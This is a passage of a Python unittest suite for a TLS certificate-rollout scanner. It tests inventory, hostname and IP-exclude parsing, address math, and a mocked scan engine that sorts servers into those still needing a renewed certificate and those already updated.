        yaml_inv = sos.parse_inventory('web01:\n  ansible_host: 0x7f.0x1\n')
        self.assertEqual(yaml_inv.servers, [])
        self.assertEqual([w.code for w in yaml_inv.warnings], ['INVALID_IP'])
        ini_inv = sos.parse_inventory('[web]\n3600\nweb02 ansible_host=127.1\n')
        self.assertEqual(ini_inv.servers, [])
        self.assertEqual([w.code for w in ini_inv.warnings], ['INVALID_IP', 'INVALID_IP'])

    def test_resolve_servers_never_hands_numbers_to_the_resolver(self):
        resolver = RecordingResolver({'app.internal': ['10.2.2.2']})
        servers = [sos.Server('bad', hostnames=['2026092401']),
                   sos.Server('app', hostnames=['app.internal'])]
        kept, warnings = sos.resolve_servers(servers, resolver=resolver)
        self.assertEqual([s.name for s in kept], ['app'])
        self.assertEqual(resolver.calls, ['app.internal'])
        self.assertIn(SERIAL_ADDRESS, str(warnings[0]))

    def test_names(self):
        valid, invalid = sos.parse_names_text('www.example.com 0x7f.0x1 127.1 2026092401\n')
        self.assertEqual(valid, ['www.example.com'])
        self.assertEqual(invalid, ['0x7f.0x1', '127.1', '2026092401'])
        for token in ('0x7f.0x1', '127.1', '2026092401', 'a.example.com 0177.0.0.1'):
            with self.subTest(token=token):
                with self.assertRaisesRegex(sos.UsageError, r'invalid name .*\(-n\)'):
                    sos.load_names([token])
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'names.txt')
            with open(path, 'w', encoding='utf-8') as handle:
                handle.write('127.1\nwww.example.com\n')
            names, warnings = sos.load_names([path])
        self.assertEqual(names, ['www.example.com'])
        self.assertEqual(len(warnings), 1)
        self.assertIn('skipped - 127.1 is not a hostname', warnings[0])
        names, warnings = sos.load_names(['-'], stdin=io.StringIO('0x7f.0x1\na.example.com\n'))
        self.assertEqual(names, ['a.example.com'])
        self.assertIn('<stdin>', warnings[0])


def ips_of(servers) -> List[str]:
    return [ip for server in servers for ip in server.ips]


class ExcludeTests(unittest.TestCase):
    """--exclude parsing (strict) and the address math."""

    def test_parse_exclude_token(self):
        cases = {
            '192.0.2.10': ('192.0.2.10', ['192.0.2.10/32']),
            ' 192.0.2.10 ': ('192.0.2.10', ['192.0.2.10/32']),
            '192.0.2.10/32': ('192.0.2.10', ['192.0.2.10/32']),
            '192.0.2.7/29': ('192.0.2.0/29', ['192.0.2.0/29']),       # host bits tolerated
            '198.51.100.5-9': ('198.51.100.5-198.51.100.9', ['198.51.100.5/32', '198.51.100.6/31',
                                                              '198.51.100.8/31']),
            '198.51.100.5-198.51.100.5': ('198.51.100.5', ['198.51.100.5/32']),
            '2001:DB8:0:0:0:0:0:5': ('2001:db8::5', ['2001:db8::5/128']),
            '[2001:db8::5]': ('2001:db8::5', ['2001:db8::5/128']),
            'fe80::1%eth0': ('fe80::1', ['fe80::1/128']),
            '2001:db8:1::/48': ('2001:db8:1::/48', ['2001:db8:1::/48']),
        }
        for token, (label, networks) in cases.items():
            with self.subTest(token=token):
                rule = sos.parse_exclude_token(token)
                self.assertEqual(rule.label, label)
                self.assertEqual([str(n) for n in rule.networks], networks)
        mapped = sos.parse_exclude_token('::FFFF:198.51.100.7')
        self.assertEqual(mapped.label, '::ffff:198.51.100.7')
        self.assertEqual(int(mapped.networks[0].network_address), (0xFFFF << 32) | 0xC6336407)
        for token in ('', 'www.example.com', '*.example.com', '2026092401', '127.1', '0x7f.0x1',
                      '010.0.0.1', '192.0.2.0/33', '192.0.2.300', 'web=192.0.2.10', 'x-y',
                      '192.0.2.10:443', 'localhost'):
            with self.subTest(token=token):
                self.assertIsNone(sos.parse_exclude_token(token))
        with self.assertRaisesRegex(sos.UsageError, 'invalid IP range'):
            sos.parse_exclude_token('192.0.2.9-192.0.2.1')
        with self.assertRaisesRegex(sos.UsageError, 'invalid IP range'):
            sos.parse_exclude_token('192.0.2.1-2001:db8::1')

    def test_load_excludes_values_files_and_stdin(self):
        rules = sos.load_excludes(['192.0.2.10 198.51.100.0/30', '203.0.113.5,2001:db8::5',
                                   '192.0.2.10', '198.51.100.1/30'])   # duplicates dropped
        self.assertEqual([r.label for r in rules],
                         ['192.0.2.10', '198.51.100.0/30', '203.0.113.5', '2001:db8::5'])
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'excludes.txt')
            with open(path, 'w', encoding='utf-16') as handle:  # PowerShell-style UTF-16
                handle.write('# keep the mail server out\n192.0.2.10  # mx\n; ini comment\n'
                             '// js comment\n2001:db8::5, 198.51.100.64/28\n\n')
            rules = sos.load_excludes([path, '203.0.113.5'])
            self.assertEqual([r.label for r in rules],
                             ['192.0.2.10', '2001:db8::5', '198.51.100.64/28', '203.0.113.5'])
            bad = os.path.join(tmp, 'bad.txt')
            with open(bad, 'w', encoding='utf-8') as handle:
                handle.write('192.0.2.10\n\nwww.example.com\n')
            with self.assertRaisesRegex(sos.UsageError, r'bad\.txt:3: --exclude takes IP '
                                                        r'addresses and CIDRs, not hostnames'):
                sos.load_excludes([bad])
        rules = sos.load_excludes(['-'], stdin=io.StringIO('\ufeff192.0.2.10\n# c\n2001:db8::/126\n'))
        self.assertEqual([r.label for r in rules], ['192.0.2.10', '2001:db8::/126'])
        self.assertEqual(sos.load_excludes([]), [])

    def test_load_excludes_is_strict(self):
        cases = [
            (['www.example.com'], 'not hostnames'),
            (['192.0.2.10 www.example.com'], 'not hostnames'),
            (['*.example.com'], 'not hostnames'),
            (['2026092401'], 'not an IP address or CIDR.*' + re.escape(SERIAL_ADDRESS)),
            (['0x7f.0x1'], 'not an IP address or CIDR.*127.0.0.1'),
            (['010.0.0.1'], 'leading zero'),
            (['192.0.2.0/33'], "'192.0.2.0/33' is not an IP address, CIDR or range"),
            (['missing-excludes.txt'], 'file not found'),
            (['no-such-dir/excludes'], 'file not found'),
            ([''], 'empty value'),
            (['192.0.2.9-1'], 'invalid IP range'),
        ]
        for values, pattern in cases:
            with self.subTest(values=values):
                with self.assertRaisesRegex(sos.UsageError, pattern):
                    sos.load_excludes(values)

    def test_slash24_minus_single_ips(self):
        servers, _ = sos.load_targets(['198.51.100.0/24'])
        self.assertEqual(len(servers), 254)
        kept, excluded = sos.apply_excludes(servers, ['198.51.100.10', '198.51.100.200',
                                                      '198.51.100.0', '198.51.100.255'])
        self.assertEqual(len(kept), 252)
        self.assertEqual([(e.ip, e.rule) for e in excluded],
                         [('198.51.100.10', '198.51.100.10'), ('198.51.100.200', '198.51.100.200')])
        self.assertEqual(sos.excluded_address_count(excluded), 2)
        kept_ips = set(ips_of(kept))
        self.assertNotIn('198.51.100.10', kept_ips)
        self.assertNotIn('198.51.100.200', kept_ips)
        self.assertEqual(len(kept_ips), 252)
        # the network/broadcast rules matched no target: reported, not silently accepted
        self.assertEqual(sos.unused_excludes(['198.51.100.10', '198.51.100.200', '198.51.100.0',
                                              '198.51.100.255'], excluded),
                         ['198.51.100.0', '198.51.100.255'])

    def test_slash24_minus_subnets_and_ranges(self):
        servers, _ = sos.load_targets(['198.51.100.0/24'])
        kept, excluded = sos.apply_excludes(servers, ['198.51.100.128/25'])
        self.assertEqual(ips_of(kept), ['198.51.100.%d' % n for n in range(1, 128)])
        self.assertEqual(len(excluded), 127)  # .128-.254 (the target list skips .255)
        kept, excluded = sos.apply_excludes(servers, ['198.51.100.0/26', '198.51.100.100-119',
                                                      '198.51.100.250/31'])
        want = [n for n in range(1, 255) if not (n < 64 or 100 <= n <= 119 or n in (250, 251))]
        self.assertEqual(ips_of(kept), ['198.51.100.%d' % n for n in want])
        self.assertEqual(sos.excluded_address_count(excluded), 63 + 20 + 2)
        self.assertEqual({e.rule for e in excluded},
                         {'198.51.100.0/26', '198.51.100.100-198.51.100.119', '198.51.100.250/31'})
        kept, excluded = sos.apply_excludes(servers, ['198.51.100.0/24'])
        self.assertEqual((kept, len(excluded)), ([], 254))

    def test_ipv6_math(self):
        servers, _ = sos.load_targets(['2001:db8::/125'])
        self.assertEqual(ips_of(servers), ['2001:db8::%d' % n for n in range(1, 8)])
        kept, excluded = sos.apply_excludes(servers, ['2001:db8::4/126', '2001:DB8:0:0:0:0:0:1'])
        self.assertEqual(ips_of(kept), ['2001:db8::2', '2001:db8::3'])
        self.assertEqual([e.ip for e in excluded],
                         ['2001:db8::1', '2001:db8::4', '2001:db8::5', '2001:db8::6', '2001:db8::7'])
        self.assertEqual({e.rule for e in excluded}, {'2001:db8::1', '2001:db8::4/126'})
        big, _ = sos.load_targets(['2001:db8:5::/120'])
        kept, excluded = sos.apply_excludes(big, ['2001:db8:5::80/121', '2001:db8:5::10'])
        self.assertEqual(len(ips_of(big)), 255)
        self.assertEqual(len(excluded), 128 + 1)
        self.assertEqual(len(kept), 255 - 129)
        # an IPv4 rule never touches IPv6 targets and vice versa
        mixed = [sos.Server('v4', ['198.51.100.7']), sos.Server('v6', ['2001:db8::7'])]
        kept, _ = sos.apply_excludes(mixed, ['2001:db8::/32'])
        self.assertEqual([s.name for s in kept], ['v4'])
        kept, _ = sos.apply_excludes(mixed, ['0.0.0.0/0'])
        self.assertEqual([s.name for s in kept], ['v6'])
        kept, _ = sos.apply_excludes(mixed, ['::/0'])
        self.assertEqual([s.name for s in kept], ['v4'])

    def test_ipv4_mapped_targets_and_rules(self):
        servers = [sos.Server('mapped', ['::ffff:198.51.100.7']),
                   sos.Server('plain', ['198.51.100.7'])]
        for rule in ('198.51.100.7', '198.51.100.0/29', '::ffff:198.51.100.7',
                     '::ffff:198.51.100.0/120', '::ffff:0:0/96'):
            with self.subTest(rule=rule):
                kept, excluded = sos.apply_excludes(servers, [rule])
                self.assertEqual(kept, [])
                self.assertEqual(sos.excluded_address_count(excluded), 2)
        kept, _ = sos.apply_excludes(servers, ['::/0'])  # every IPv6 form, not plain IPv4
        self.assertEqual([s.name for s in kept], ['plain'])

    def test_partial_servers_are_copies(self):
        web = sos.Server('web', ['192.0.2.10', '192.0.2.20', '2001:db8::a'], ['prod'])
        db = sos.Server('db', ['192.0.2.30'])
        both = sos.Server('dup', ['192.0.2.10'])  # the same IP on two servers
        kept, excluded = sos.apply_excludes([web, db, both], ['192.0.2.10', '2001:db8::a'])
        self.assertEqual([(s.name, s.ips, s.groups) for s in kept],
                         [('web', ['192.0.2.20'], ['prod']), ('db', ['192.0.2.30'], [])])
        self.assertIs(kept[1], db)                                   # untouched servers reused
        self.assertEqual(web.ips, ['192.0.2.10', '192.0.2.20', '2001:db8::a'])  # input intact
        self.assertEqual([(e.server, e.ip) for e in excluded],
                         [('web', '192.0.2.10'), ('web', '2001:db8::a'), ('dup', '192.0.2.10')])
        self.assertEqual(sos.excluded_address_count(excluded), 2)
        self.assertEqual(sos.apply_excludes([web], []), ([web], []))

    def test_overlapping_rules_and_unused(self):
        servers, _ = sos.load_targets(['198.51.100.0/30'])
        rules = sos.load_excludes(['198.51.100.0/24', '198.51.100.1', '203.0.113.0/24'])
        kept, excluded = sos.apply_excludes(servers, rules)
        self.assertEqual(kept, [])
        self.assertEqual({e.rule for e in excluded}, {'198.51.100.0/24'})  # first match wins
        # the shadowed single IP still matched a target; only the unrelated /24 is unused
        self.assertEqual(sos.unused_excludes(rules, excluded), ['203.0.113.0/24'])

    def test_bad_rule_objects_raise(self):
        with self.assertRaisesRegex(sos.UsageError, 'not hostnames'):
            sos.apply_excludes([sos.Server('a', ['192.0.2.10'])], ['www.example.com'])

    def test_large_block_is_fast_enough(self):
        servers, _ = sos.load_targets(['10.20.0.0/18'])
        started = time.monotonic()
        kept, excluded = sos.apply_excludes(servers, ['10.20.0.0/19', '10.20.40.1',
                                                      '10.20.63.0/24'])
        elapsed = time.monotonic() - started
        self.assertEqual(sos.excluded_address_count(excluded), (8192 - 1) + 1 + 255)
        self.assertEqual(len(kept), 16382 - len(excluded))
        self.assertLess(elapsed, 20)


# ================================================================ engine (mocked I/O)

RSA_DER = sos.parse_certificate(fixture_bytes('rsa_multi_san.der')).der
EC_DER = fixture_cert('ec_wildcard.pem').der
RENEWED_DER = fixture_cert('cli_renewed_wild.pem').der
CN_ONLY_DER = fixture_cert('cn_only.pem').der


class FakeNetwork:
    """Scriptable connect/TLS functions: {ip: behaviour}."""

    def __init__(self, connect: Dict[str, object], tls: Dict[str, object]) -> None:
        self.connect = connect
        self.tls = tls
        self.calls = []  # type: List[Tuple[str, int, Optional[str]]]
        self.lock = threading.Lock()

    def connect_fn(self, ip: str, port: int, timeout: float) -> None:
        outcome = self.connect.get(ip)
        if isinstance(outcome, BaseException):
            raise outcome

    def tls_fn(self, ip: str, port: int, sni: Optional[str], timeout: float):
        with self.lock:
            self.calls.append((ip, port, sni))
        behaviour = self.tls[ip]
        if callable(behaviour):
            behaviour = behaviour(sni)
        if isinstance(behaviour, BaseException):
            raise behaviour
        if isinstance(behaviour, sos.TlsResult):
            return behaviour
        return sos.TlsResult(der=behaviour, version='TLSv1.3')


def by_old_or_new(old_der: bytes, default: Optional[bytes] = None):
    def pick(sni):
        if sni is None:
            return default or CN_ONLY_DER
        if sni.endswith('example-test.com.tr'):
            return RSA_DER
        if sni.endswith('wild.example.net'):
            return old_der
        return CN_ONLY_DER
    return pick


class EngineTests(unittest.TestCase):

    def scan(self, servers, names, network, new_certs=(), ports=(443,), **kwargs):
        probes = sos.build_probe_names(names)
        return sos.run_scan(servers, probes, list(ports), new_certs=new_certs, timeout=1,
                            workers=4, connect_fn=network.connect_fn, tls_fn=network.tls_fn,
                            **kwargs)

    def rows(self, report, server=None, probe=None):
        return {(r.server, r.port, r.name): r for r in report.results
                if (server is None or r.server == server) and (probe is None or r.probe == probe)}

    def test_statuses(self):
        renewed = fixture_cert('cli_renewed_wild.pem')
        servers = [sos.Server('old', ['10.0.0.1']), sos.Server('new', ['10.0.0.2']),
                   sos.Server('closed', ['10.0.0.3']), sos.Server('slow', ['10.0.0.4']),
                   sos.Server('broken', ['10.0.0.5']), sos.Server('strict', ['10.0.0.6']),
                   sos.Server('unreach', ['10.0.0.7'])]
        network = FakeNetwork(
            connect={'10.0.0.3': ConnectionRefusedError(), '10.0.0.4': None,
                     '10.0.0.7': OSError(113, 'No route to host')},
            tls={'10.0.0.1': by_old_or_new(EC_DER), '10.0.0.2': by_old_or_new(RENEWED_DER),
                 '10.0.0.4': socket.timeout('timed out'),
                 '10.0.0.5': ssl.SSLError(1, '[SSL: WRONG_VERSION_NUMBER] wrong version number '
                                             '(_ssl.c:1000)'),
                 '10.0.0.6': sos.TlsResult(status=sos.NOT_HOSTED, error='rejected')})
        report = self.scan(servers, ['a.wild.example.net', 'www.example-test.com.tr',
                                     'nothere.example.com'] + renewed.hostnames,
                           network, new_certs=[renewed])
        rows = self.rows(report)
        self.assertEqual(rows[('old', 443, 'a.wild.example.net')].status, sos.NEEDS_UPDATE)
        self.assertEqual(rows[('old', 443, 'a.wild.example.net')].covered_by,
                         '*.wild.example.net')
        self.assertEqual(rows[('old', 443, '*.wild.example.net')].status, sos.NEEDS_UPDATE)
        self.assertEqual(rows[('old', 443, '*.wild.example.net')].probe, sos.PROBE_WILDCARD)
        self.assertEqual(rows[('old', 443, 'wild.example.net')].status, sos.NEEDS_UPDATE)
        self.assertEqual(rows[('old', 443, 'nothere.example.com')].status, sos.NOT_HOSTED)
        www = rows[('old', 443, 'www.example-test.com.tr')]
        self.assertEqual(www.status, sos.NEEDS_UPDATE)
        self.assertIs(www.new_cert_covers, False)
        self.assertIs(rows[('old', 443, 'a.wild.example.net')].new_cert_covers, True)
        for name in ('a.wild.example.net', '*.wild.example.net', 'wild.example.net'):
            self.assertEqual(rows[('new', 443, name)].status, sos.UPDATED, name)
        self.assertEqual(rows[('closed', 443, None)].status, sos.CLOSED)
        self.assertEqual(rows[('closed', 443, None)].probe, sos.PROBE_CONNECT)
        self.assertEqual(rows[('unreach', 443, None)].status, sos.CLOSED)
        self.assertEqual(rows[('unreach', 443, None)].error, 'No route to host')
        self.assertEqual(rows[('slow', 443, 'a.wild.example.net')].status, sos.TIMEOUT)
        broken = rows[('broken', 443, 'a.wild.example.net')]
        self.assertEqual(broken.status, sos.TLS_ERROR)
        self.assertEqual(broken.error, '[SSL: WRONG_VERSION_NUMBER] wrong version number')
        self.assertEqual(rows[('strict', 443, 'a.wild.example.net')].status, sos.NOT_HOSTED)

        # "new" still serves another cert for www.example-test.com.tr (row NEEDS_UPDATE),
        # but the new cert does not cover that name, so the server counts as UPDATED.
        self.assertEqual(rows[('new', 443, 'www.example-test.com.tr')].status, sos.NEEDS_UPDATE)
        statuses = {s.server.name: s.status for s in report.server_summaries()}
        self.assertEqual(statuses, {'old': sos.NEEDS_UPDATE, 'new': sos.UPDATED,
                                    'closed': sos.CLOSED, 'slow': sos.TIMEOUT,
                                    'broken': sos.TLS_ERROR, 'strict': sos.NOT_HOSTED,
                                    'unreach': sos.CLOSED})
        self.assertTrue(report.needs_update())

    def test_names_outside_the_new_cert_do_not_make_a_server_need_it(self):
        renewed = fixture_cert('cli_renewed_wild.pem')
        network = FakeNetwork({}, {
            # hosts www.example-test.com.tr (not in the new cert) and nothing else
            '10.0.0.1': lambda sni: RSA_DER if sni and sni.startswith('www.') else CN_ONLY_DER,
            # default (no SNI) cert covers only a name outside the new cert
            '10.0.0.2': lambda sni: RSA_DER if sni is None else CN_ONLY_DER})
        servers = [sos.Server('legacy', ['10.0.0.1']), sos.Server('default-rsa', ['10.0.0.2'])]
        report = self.scan(servers, ['www.example-test.com.tr', 'a.wild.example.net'], network,
                           new_certs=[renewed])
        rows = self.rows(report)
        self.assertEqual(rows[('legacy', 443, 'www.example-test.com.tr')].status,
                         sos.NEEDS_UPDATE)
        self.assertEqual(rows[('default-rsa', 443, None)].status, sos.NOT_HOSTED)
        statuses = {s.server.name: s.status for s in report.server_summaries()}
        self.assertEqual(statuses, {'legacy': sos.NOT_HOSTED, 'default-rsa': sos.NOT_HOSTED})
        self.assertFalse(report.needs_update())
        doc = sos.report_to_dict(report)
        legacy = next(s for s in doc['servers'] if s['name'] == 'legacy')
        self.assertEqual(legacy['needsUpdate'], [])
        self.assertEqual(legacy['hostedNotInNewCert'], ['www.example-test.com.tr'])
        text = sos.render_summary(report)
        self.assertIn('Hosting only names the new certificate does not cover: 1', text)
        self.assertIn('(not covered by the new certificate)', text)
        self.assertIn('Servers that need the new certificate: 0', text)

    def test_handshakes_are_shared_per_sni(self):
        network = FakeNetwork({}, {'10.0.0.1': by_old_or_new(EC_DER)})
        servers = [sos.Server('a', ['10.0.0.1']), sos.Server('b', ['10.0.0.1'])]  # same IP
        report = self.scan(servers, ['x.wild.example.net', 'X.wild.example.net',
                                     '*.wild.example.net'], network, ports=(443, 8443))
        # 2 ports x (no-SNI + x.wild + base + wildcard probe) handshakes, not per server
        self.assertEqual(len(network.calls), 2 * 4)
        self.assertEqual(len({(ip, port, sni) for ip, port, sni in network.calls}), 8)
        self.assertEqual(len(report.endpoints), 2)
        # rows are per server
        self.assertEqual(len([r for r in report.results if r.server == 'a']), 2 * 4)

    def test_default_certificate_verdicts(self):
        renewed = fixture_cert('cli_renewed_wild.pem')
        network = FakeNetwork({}, {
            '10.0.0.1': by_old_or_new(RENEWED_DER, default=EC_DER),   # partially updated
            '10.0.0.2': by_old_or_new(RENEWED_DER, default=RENEWED_DER),
            '10.0.0.3': by_old_or_new(RENEWED_DER, default=CN_ONLY_DER),
            '10.0.0.4': lambda sni: (ssl.SSLError(1, 'sni required') if sni is None
                                     else RENEWED_DER)})
        servers = [sos.Server('partial', ['10.0.0.1']), sos.Server('full', ['10.0.0.2']),
                   sos.Server('other-default', ['10.0.0.3']),
                   sos.Server('sni-only', ['10.0.0.4'])]
        report = self.scan(servers, ['a.wild.example.net'], network, new_certs=[renewed])
        defaults = {r.server: r for r in report.results if r.probe == sos.PROBE_DEFAULT}
        self.assertEqual(defaults['partial'].status, sos.NEEDS_UPDATE)
        self.assertEqual(defaults['partial'].covered_by, '*.wild.example.net')
        self.assertEqual(defaults['full'].status, sos.UPDATED)
        self.assertEqual(defaults['other-default'].status, sos.NOT_HOSTED)
        self.assertEqual(defaults['sni-only'].status, sos.TLS_ERROR)
        statuses = {s.server.name: s.status for s in report.server_summaries()}
        self.assertEqual(statuses, {'partial': sos.NEEDS_UPDATE, 'full': sos.UPDATED,
                                    'other-default': sos.UPDATED, 'sni-only': sos.UPDATED})
        counts = report.status_counts()  # no-SNI rows are not counted
        self.assertEqual(counts[sos.UPDATED], 4)
        self.assertEqual(counts[sos.TLS_ERROR], 0)

    def test_refused_name_on_a_working_endpoint_is_not_hosted(self):
        def alert(reason):
            exc = ssl.SSLError(1, '[SSL: %s] alert' % reason)
            exc.reason = reason
            return exc

        network = FakeNetwork({}, {
            # Cloudflare-like: unknown SNI and missing SNI -> handshake_failure alert
            '10.0.0.1': lambda sni: (RSA_DER if sni and sni.endswith('example-test.com.tr')
                                     else alert('SSLV3_ALERT_HANDSHAKE_FAILURE')),
            # HAProxy strict-sni-like: closes the connection for unknown names
            '10.0.0.2': lambda sni: (RSA_DER if sni and sni.endswith('example-test.com.tr')
                                     else ssl.SSLEOFError(8, 'EOF occurred')),
            # nothing works at all: cannot tell, stays TLS_ERROR
            '10.0.0.3': lambda sni: alert('SSLV3_ALERT_HANDSHAKE_FAILURE')})
        servers = [sos.Server('cf', ['10.0.0.1']), sos.Server('haproxy', ['10.0.0.2']),
                   sos.Server('broken', ['10.0.0.3'])]
        report = self.scan(servers, ['www.example-test.com.tr', 'other.example.com'], network)
        rows = self.rows(report)
        for server in ('cf', 'haproxy'):
            self.assertEqual(rows[(server, 443, 'www.example-test.com.tr')].status,
                             sos.NEEDS_UPDATE)
            other = rows[(server, 443, 'other.example.com')]
            self.assertEqual(other.status, sos.NOT_HOSTED, server)
            self.assertIn('server refused this name', other.error)
            default = rows[(server, 443, None)]
            self.assertEqual(default.status, sos.NOT_HOSTED, server)
            self.assertIn('server requires SNI', default.error)
        self.assertEqual(rows[('broken', 443, 'other.example.com')].status, sos.TLS_ERROR)
        self.assertEqual(rows[('broken', 443, None)].status, sos.TLS_ERROR)
        # a close / reset is retried once (it could be a connection limiter); an alert is not
        calls = {(ip, sni): network.calls.count((ip, 443, sni)) for ip, _, sni in network.calls}
        self.assertEqual(calls[('10.0.0.2', 'other.example.com')], 2)
        self.assertEqual(calls[('10.0.0.2', None)], 2)
        self.assertEqual(calls[('10.0.0.2', 'www.example-test.com.tr')], 1)
        self.assertEqual({count for (ip, _), count in calls.items() if ip != '10.0.0.2'}, {1})
        self.assertTrue(sos.is_refusal(ssl.SSLEOFError()))
        self.assertTrue(sos.is_refusal(ssl.SSLZeroReturnError()))
        self.assertTrue(sos.is_refusal(ConnectionResetError()))
        self.assertFalse(sos.is_refusal(socket.timeout()))
        self.assertFalse(sos.is_refusal(ssl.SSLError(1, 'no reason')))
        # a bare close before any TLS record is SSLZeroReturnError on some Linux builds
        for exc in (ssl.SSLEOFError(), ssl.SSLZeroReturnError(), ConnectionResetError(),
                    ConnectionAbortedError(), ConnectionRefusedError(), BrokenPipeError()):
            self.assertTrue(sos.is_transient(exc), exc)
        self.assertEqual(sos.classify_exception(ssl.SSLZeroReturnError())[1],
                         'connection closed during the TLS handshake')
        for exc in (alert('SSLV3_ALERT_HANDSHAKE_FAILURE'), socket.timeout(), OSError(5, 'io')):
            self.assertFalse(sos.is_transient(exc), exc)

    def test_connection_limit_resets_are_not_read_as_refusals(self):
        # A server that resets a client's connections beyond 3 open ones (nginx stream
        # limit_conn, HAProxy src_conn_cur, WAF appliances), probed with 64 workers.
        active, peak, lock = {}, {}, threading.Lock()

        def limited(ip, port, sni, timeout):
            key = (ip, port)
            with lock:
                active[key] = active.get(key, 0) + 1
                peak[key] = max(peak.get(key, 0), active[key])
                over = active[key] > 3
            try:
                time.sleep(0.02)
                if over:
                    raise ConnectionResetError(10054, 'reset by a connection limiter')
                return sos.TlsResult(der=EC_DER if sni and sni.endswith('wild.example.net')
                                     else CN_ONLY_DER, version='TLSv1.3')
            finally:
                with lock:
                    active[key] -= 1

        names = ['h%02d.wild.example.net' % i for i in range(60)] + ['app.example.com']
        report = sos.run_scan([sos.Server('web', ['10.0.0.1']), sos.Server('api', ['10.0.0.2'])],
                              sos.build_probe_names(names), [443],
                              new_certs=[fixture_cert('cli_renewed_wild.pem')], timeout=1,
                              workers=64, connect_fn=lambda *a: None, tls_fn=limited)
        self.assertLessEqual(max(peak.values()), sos.MAX_PER_ENDPOINT)
        rows = [r for r in report.results if r.probe == sos.PROBE_SNI]
        self.assertEqual(len(rows), 2 * 61)
        self.assertEqual({r.status for r in rows if r.name != 'app.example.com'},
                         {sos.NEEDS_UPDATE})
        self.assertEqual({r.status for r in rows if r.name == 'app.example.com'},
                         {sos.NOT_HOSTED})
        self.assertFalse([r for r in report.results if r.error])
        self.assertEqual([s.status for s in report.server_summaries()], [sos.NEEDS_UPDATE] * 2)
        self.assertEqual(len(sos.report_to_dict(report)['servers'][0]['needsUpdate']), 60)

    def test_a_silent_endpoint_does_not_stall_the_scan(self):
        # Two endpoints accept TCP and never finish TLS (a tarpit, a balancer without a
        # backend). Held to MAX_PER_ENDPOINT handshakes, each would cost one timeout per
        # four names; the cap is lifted there once the first handshakes all time out.
        silent = {'10.0.0.1', '10.0.0.2'}
        active, peak, lock = {}, {}, threading.Lock()

        def tls(ip, port, sni, timeout):
            with lock:
                active[ip] = active.get(ip, 0) + 1
                peak[ip] = max(peak.get(ip, 0), active[ip])
            try:
                if ip in silent:
                    time.sleep(timeout)
                    raise socket.timeout('timed out')
                time.sleep(0.005)
                return sos.TlsResult(der=EC_DER, version='TLSv1.3')
            finally:
                with lock:
                    active[ip] -= 1

        names = ['h%02d.wild.example.net' % i for i in range(80)]
        timeout = 0.2
        began = time.monotonic()
        # strict_public: EC_DER is self-signed, and the verdict does not matter here
        report = sos.run_scan([sos.Server('s%d' % i, ['10.0.0.%d' % i]) for i in range(1, 9)],
                              sos.build_probe_names(names), [443], timeout=timeout, workers=32,
                              connect_fn=lambda *a: None, tls_fn=tls, strict_public=True)
        elapsed = time.monotonic() - began
        capped = -(-(len(names) + 1) // sos.MAX_PER_ENDPOINT) * timeout  # 21 rounds: 4.2 s
        self.assertLess(elapsed, capped / 2)
        self.assertLessEqual(max(n for ip, n in peak.items() if ip not in silent),
                             sos.MAX_PER_ENDPOINT)
        rows = [r for r in report.results if r.ip in silent]
        self.assertEqual(len(rows), 2 * 81)  # every name is still probed there
        self.assertEqual({r.status for r in rows}, {sos.TIMEOUT})
        self.assertEqual({r.status for r in report.results
                          if r.ip not in silent and r.probe == sos.PROBE_SNI}, {sos.NEEDS_UPDATE})

    def test_an_endpoint_hanging_on_most_names_is_not_held_to_the_cap(self):
        # An SNI router with a dead backend: the default certificate and a few names answer
        # at once, the rest hang until the timeout. The first answers must not keep the cap.
        answering = {None, 'h00.wild.example.net', 'h01.wild.example.net'}

        def tls(ip, port, sni, timeout):
            if sni in answering:
                return sos.TlsResult(der=EC_DER, version='TLSv1.3')
            time.sleep(timeout)
            raise socket.timeout('timed out')

        names = ['h%02d.wild.example.net' % i for i in range(60)]
        timeout = 0.2
        began = time.monotonic()
        report = sos.run_scan([sos.Server('s1', ['10.0.0.1'])], sos.build_probe_names(names), [443],
                              timeout=timeout, workers=64, connect_fn=lambda *a: None, tls_fn=tls)
        elapsed = time.monotonic() - began
        capped = -(-(len(names) - 2) // sos.MAX_PER_ENDPOINT) * timeout  # 15 rounds: 3 s
        self.assertLess(elapsed, capped / 2)
        self.assertEqual(sum(1 for r in report.results if r.status == sos.TIMEOUT), 58)

    def test_without_new_cert_every_hit_is_needs_update(self):
        network = FakeNetwork({}, {'10.0.0.1': by_old_or_new(EC_DER)})
        report = self.scan([sos.Server('s', ['10.0.0.1'])], ['www.example-test.com.tr'],
                           network)
        row = self.rows(report, probe=sos.PROBE_SNI)[('s', 443, 'www.example-test.com.tr')]
        self.assertEqual(row.status, sos.NEEDS_UPDATE)
        self.assertIsNone(row.new_cert_covers)

    def test_default_probe_can_be_disabled(self):
        network = FakeNetwork({}, {'10.0.0.1': by_old_or_new(EC_DER)})
        report = self.scan([sos.Server('s', ['10.0.0.1'])], ['a.wild.example.net'], network,
                           default_probe=False)
        self.assertNotIn(None, [sni for _, _, sni in network.calls])
        self.assertEqual({r.probe for r in report.results}, {sos.PROBE_SNI})
        # nothing to probe at all: an empty report, not an IndexError
        empty = sos.run_scan([sos.Server('s', ['10.0.0.1'])], [], [443], timeout=0.1, workers=2,
                             default_probe=False, connect_fn=lambda *a: None,
                             tls_fn=lambda *a: sos.TlsResult(der=EC_DER))
        self.assertEqual(empty.results, [])

    def test_unparseable_certificate_and_unexpected_errors(self):
        network = FakeNetwork({}, {'10.0.0.1': b'\x30\x03\x02\x01\x01',
                                   '10.0.0.2': RuntimeError('boom'),
                                   '10.0.0.3': sos.TlsResult(der=None, status=sos.TLS_ERROR,
                                                             error='server sent no certificate')})
        servers = [sos.Server('a', ['10.0.0.1']), sos.Server('b', ['10.0.0.2']),
                   sos.Server('c', ['10.0.0.3'])]
        # a hostile server's certificate costs one row, never the whole scan
        for number, der in enumerate(HOSTILE_DERS.values(), 11):
            network.tls['10.0.0.%d' % number] = der
            servers.append(sos.Server('hostile%d' % number, ['10.0.0.%d' % number]))
        report = self.scan(servers, ['x.example.com'], network)
        rows = self.rows(report, probe=sos.PROBE_SNI)
        self.assertEqual(rows[('a', 443, 'x.example.com')].status, sos.TLS_ERROR)
        self.assertIn('unparseable certificate', rows[('a', 443, 'x.example.com')].error)
        self.assertEqual(rows[('b', 443, 'x.example.com')].error, 'RuntimeError: boom')
        self.assertEqual(rows[('c', 443, 'x.example.com')].error, 'server sent no certificate')
        for number in range(11, 11 + len(HOSTILE_DERS)):
            row = rows[('hostile%d' % number, 443, 'x.example.com')]
            self.assertEqual(row.status, sos.TLS_ERROR)
